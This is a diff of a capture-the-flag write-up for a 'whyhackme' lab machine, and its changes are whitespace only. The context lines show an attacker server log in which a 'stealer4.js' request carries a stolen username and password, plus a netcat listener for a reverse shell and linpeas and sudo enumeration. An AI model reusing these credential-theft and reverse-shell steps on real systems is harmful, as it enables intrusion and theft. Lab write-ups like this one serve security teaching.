@@ -119,7 +119,7 @@ log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
 <h2> PrivEscalation lateral moving </h2>
---
+
 get access via ssh as jack run linpeas and get this
 
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
@@ -132,7 +132,7 @@ User jack may run the following commands on ubuntu:
 --remote-debugging-port
 jack@ubuntu:/opt$ ls
 capture.pcap  urgent.txt
----
+
 <h3> Analysing captured packet</h3>
   
 you need TLS key for decryption 
@@ -177,6 +177,7 @@ https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukh
 nc -lvnp 4444
 
 <h2>PrivEsc</h2>
+
 www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on ubuntu:
